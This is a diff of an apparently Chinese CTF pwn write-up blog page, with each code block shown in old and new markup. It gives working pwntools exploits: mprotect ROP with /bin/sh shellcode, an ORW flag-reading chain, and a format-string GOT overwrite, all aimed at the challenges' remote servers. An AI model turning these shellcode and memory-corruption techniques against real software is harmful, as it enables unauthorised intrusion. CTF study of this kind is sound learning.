class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;-100000000&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>payload += p64(pop_rdi_addr) + p64(<span class="hljs-number">0x4E6000</span>) + p64(pop_rsi_addr) + p64(<span class="hljs-number">0x3000</span>) + p64(pop_rdx_rbx_addr) + p64(<span class="hljs-number">0x7</span>) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 布置mprotect()函数的参数</span><br>payload += p64(mprotect_addr) + p64(ret_addr) + p64(main_addr)  <span class="hljs-comment"># 跳转到mprotect()函数后返回到main()数</span><br>io.sendline(payload)<br><br><br><br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;-100000000&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>shellcode = <span class="hljs-string">b&#x27;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span><br>payload = shellcode.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p64(name_addr)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>法三：ORW<br>使用open，read，write函数组合 </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./shaokao&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28438</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">make_addr=<span class="number">0x4e6000</span> <span class="comment">#页面对齐地址</span></span><br><span class="line">size=<span class="number">0x3000</span></span><br><span class="line">name_addr = <span class="number">0x4E60F0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x40264f</span><span class="comment">#修改内存页首地址</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x40a67e</span><span class="comment">#修改内存页大小</span></span><br><span class="line">pop_rdx_rbx_addr = <span class="number">0x4a404b</span><span class="comment">#修改权限</span></span><br><span class="line"><span class="comment">#pop_rax_addr = 0x458827</span></span><br><span class="line"><span class="comment">#syscall_addr = 0x402404</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">open_addr = elf.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;-100000000&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">ORW=p64(pop_rdi_addr)+p64(name_addr)+p64(pop_rsi_addr)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">ORW+=p64(pop_rdi_addr)+p64(<span class="number">3</span>)+p64(pop_rsi_addr)+p64(name_addr)+p64(pop_rdx_rbx_addr)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">ORW+=p64(pop_rdi_addr)+p64(<span class="number">1</span>)+p64(pop_rsi_addr)+p64(name_addr)+p64(pop_rdx_rbx_addr)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)  <span class="comment"># 向 name_addr 处填入b&#x27;./flag\x00\x00&#x27; 并补齐 8 字节，将长度填充到 0x28 至返回地址处</span></span><br><span class="line">payload += ORW</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)  <span class="hljs-comment"># 打印调试信息</span><br>content = <span class="hljs-number">0</span> <span class="hljs-comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><br><br><span class="hljs-keyword">if</span> content == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&quot;./shaokao&quot;</span>)  <span class="hljs-comment"># 程序路径</span><br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28438</span>)  <span class="hljs-comment"># 题目的远程端口</span><br><br>elf = ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>make_addr=<span class="hljs-number">0x4e6000</span> <span class="hljs-comment">#页面对齐地址</span><br>size=<span class="hljs-number">0x3000</span><br>name_addr = <span class="hljs-number">0x4E60F0</span><br>pop_rdi_addr = <span class="hljs-number">0x40264f</span><span class="hljs-comment">#修改内存页首地址</span><br>pop_rsi_addr = <span class="hljs-number">0x40a67e</span><span class="hljs-comment">#修改内存页大小</span><br>pop_rdx_rbx_addr = <span class="hljs-number">0x4a404b</span><span class="hljs-comment">#修改权限</span><br><span class="hljs-comment">#pop_rax_addr = 0x458827</span><br><span class="hljs-comment">#syscall_addr = 0x402404</span><br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>open_addr = elf.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;-100000000&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>ORW=p64(pop_rdi_addr)+p64(name_addr)+p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(pop_rdx_rbx_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>ORW+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_addr)+p64(name_addr)+p64(pop_rdx_rbx_addr)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(read_addr)<br>ORW+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_addr)+p64(name_addr)+p64(pop_rdx_rbx_addr)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(write_addr)<br><br>payload = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 向 name_addr 处填入b&#x27;./flag\x00\x00&#x27; 并补齐 8 字节，将长度填充到 0x28 至返回地址处</span><br>payload += ORW<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
 
 <h2 id="MoeCTF-2022-babyfmt"><a href="#MoeCTF-2022-babyfmt" class="headerlink" title="[MoeCTF 2022]babyfmt"></a>[MoeCTF 2022]babyfmt</h2><blockquote>
 <p>got劫持</p>
 </blockquote>
-<img src="/2025/11/26/pwn-11/image-4.png" class=""> 
+<img src="/2025/11/26/pwn-11/image-4.png" srcset="/img/loading.gif" lazyload class=""> 
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [esp+18h] [ebp-110h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [esp+1Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+11Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10u</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p&quot;</span>, backdoor);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xFFu</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [esp+18h] [ebp-110h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-10Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+11Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  s = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10u</span>);<br>  <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%p&quot;</span>, backdoor);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;gift: %p\n&quot;</span>, s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xFFu</span>);<br>    <span class="hljs-built_in">printf</span>(buf);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>放进IDA可以看到有后门函数，但由于主函数是一直循环的，不能将地址直接覆盖为后门函数地址<br>那就是使用got劫持了，首先保护措施“Partial RELRO”，意味着GOT部分可写，即.got劫持可行<br>，通过格式化字符串漏洞的任意写将printf的got地址写成后门函数的地址，当再执行printf函数时就可以getshell</p>
-<img src="/2025/11/26/pwn-11/image-5.png" class=""> 
+<img src="/2025/11/26/pwn-11/image-5.png" srcset="/img/loading.gif" lazyload class=""> 
 <p>发现偏移为11</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> <span class="comment"># 打印调试信息</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 程序路径</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=remote( <span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">23990</span>)  <span class="comment"># 题目的远程端口</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got=<span class="number">0x0804A010</span></span><br><span class="line">backdoor=<span class="number">0x0804859B</span></span><br><span class="line">payload = p32(printf_got) + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(backdoor-<span class="number">4</span>).encode() + <span class="string">b&#x27;c%11$n&#x27;</span></span><br><span class="line"><span class="comment">#分解为三部分：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.p32(printf_got)= 4字节的地址 0x0804A010</span></span><br><span class="line"><span class="comment">#2.b&#x27;%&#x27; + str(backdoor-4).encode() + b&#x27;c&#x27;= 输出控制</span></span><br><span class="line"><span class="comment">#3.%11$n= 写入指令</span></span><br><span class="line"><span class="comment">#p32(printf_got)   将0x0804A010压入栈的第11个位置</span></span><br><span class="line"><span class="comment">## backdoor = 0x0804859B = 134,514,075 (十进制)</span></span><br><span class="line"><span class="comment"># backdoor - 4 = 134,514,071</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x27;%134514071c&#x27;   这个格式化符会输出134,514,071个空格字符</span></span><br><span class="line"><span class="comment">#%11$n  将输出的字符数写入到第11个参数所指向的地址中</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br> <span class="hljs-comment"># 打印调试信息</span><br>content = <span class="hljs-number">0</span> <span class="hljs-comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><br><br><span class="hljs-keyword">if</span> content == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)  <span class="hljs-comment"># 程序路径</span><br><span class="hljs-keyword">else</span>:<br>    r=remote( <span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">23990</span>)  <span class="hljs-comment"># 题目的远程端口</span><br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>printf_got=<span class="hljs-number">0x0804A010</span><br>backdoor=<span class="hljs-number">0x0804859B</span><br>payload = p32(printf_got) + <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(backdoor-<span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%11$n&#x27;</span><br><span class="hljs-comment">#分解为三部分：</span><br><br><span class="hljs-comment">#1.p32(printf_got)= 4字节的地址 0x0804A010</span><br><span class="hljs-comment">#2.b&#x27;%&#x27; + str(backdoor-4).encode() + b&#x27;c&#x27;= 输出控制</span><br><span class="hljs-comment">#3.%11$n= 写入指令</span><br><span class="hljs-comment">#p32(printf_got)   将0x0804A010压入栈的第11个位置</span><br><span class="hljs-comment">## backdoor = 0x0804859B = 134,514,075 (十进制)</span><br><span class="hljs-comment"># backdoor - 4 = 134,514,071</span><br><br><span class="hljs-comment">#&#x27;%134514071c&#x27;   这个格式化符会输出134,514,071个空格字符</span><br><span class="hljs-comment">#%11$n  将输出的字符数写入到第11个参数所指向的地址中</span><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>而栈的一行刚好能存储4B的数据（p32(printf_got)刚好4B），即格式控制符%11$n对应的要写入的地址就是printf_got<br>通过%c能控制输出字符的数量，控制p32(printf_got) + b’%’ + str(backdoor-4).encode()输出的字符数量刚好等于0x0804859B，与%n形成配合，最终使得printf_got地址处被写入了地址0x0804859B即backdoor的地址</p>
 <p>但其实有函数直接将这些步骤执行了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x0804A010</span></span><br><span class="line">backdoor = <span class="number">0x0804859B</span></span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">11</span>,&#123;printf_got:backdoor&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>printf_got = <span class="hljs-number">0x0804A010</span><br>backdoor = <span class="hljs-number">0x0804859B</span><br><br>payload=fmtstr_payload(<span class="hljs-number">11</span>,&#123;printf_got:backdoor&#125;)<br><br>p.sendline(payload)<br>p.interactive()  <br></code></pre></td></tr></table></figure>
 <p>fmtstr_payload函数帮我们干了所有的事情（除了定位输入位置，11）</p>
 <p>定位好位置后，我们只需要输入一个字典元素比如Poc中的{printf_got: backdoor}</p>
 <p>这个字典清晰地描述了我们的意图，即：“我想要在printf_got这个地址，写入backdoor这个值”</p>
 <p>我们也可以同时提供多个写入目标，例如 {addr1: val1, addr2: val2}，pwntools会自动帮你生成一个能完成所有写入的payload</p>
-<h2 id="HDCTF-2023-Minions"><a href="#HDCTF-2023-Minions" class="headerlink" title="[HDCTF 2023]Minions"></a>[HDCTF 2023]Minions</h2><img src="/2025/11/26/pwn-11/image-7.png" class=""> 
+<h2 id="HDCTF-2023-Minions"><a href="#HDCTF-2023-Minions" class="headerlink" title="[HDCTF 2023]Minions"></a>[HDCTF 2023]Minions</h2><img src="/2025/11/26/pwn-11/image-7.png" srcset="/img/loading.gif" lazyload class=""> 
 <p>放进IDA，查看主函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have an invitation key?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">102</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;welcome,tell me more about you&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s great.Do you like Minions?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;hdctf, <span class="number">0x28u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry,you can&#x27;t in&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  init(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nDo you have an invitation key?&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( key == <span class="hljs-number">102</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome,tell me more about you&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40u</span>LL);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;That&#x27;s great.Do you like Minions?&quot;</span>);<br>    read(<span class="hljs-number">0</span>, &amp;hdctf, <span class="hljs-number">0x28u</span>LL);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;sorry,you can&#x27;t in&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>先进入vlun函数，查看vlun</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HDCTF.What you name?\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xD0u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
